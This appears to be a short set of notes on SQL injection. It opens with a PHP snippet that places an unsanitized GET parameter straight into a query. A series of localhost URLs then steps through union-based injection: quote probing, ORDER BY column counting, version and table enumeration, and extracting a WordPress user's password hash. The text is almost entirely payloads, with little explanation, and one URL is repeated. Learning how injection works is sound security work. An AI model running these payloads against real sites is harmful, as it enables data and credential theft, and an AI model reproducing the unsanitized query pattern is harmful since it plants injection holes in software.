http://localhost/show.php?article=1

// The article parameter is assigned to $article variable without any sanitization or validation
$articleid = $_GET[‘article’];

// The $articleid parameter is passed as part of the query
$query = "SELECT * FROM articles WHERE articleid = $articleid";

$query = "SELECT * FROM articles WHERE articleid = 1 AND 1=1";
$query = "SELECT * FROM articles WHERE articleid = 1 AND 1=2";

http://localhost/endpoint.php?user=1

http://localhost/endpoint.php?user=1’

http://localhost/endpoint.php?user=1+ORDER+BY+10

http://localhost/endpoint.php?user=1+ORDER+BY+11

http://localhost/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,10

http://localhost/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,version()

http://localhost/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())

http://localhost/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+user_pass+FROM+wp_users+WHERE+ID=1)

http://localhost/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+user_pass+FROM+wp_users+WHERE+ID=1)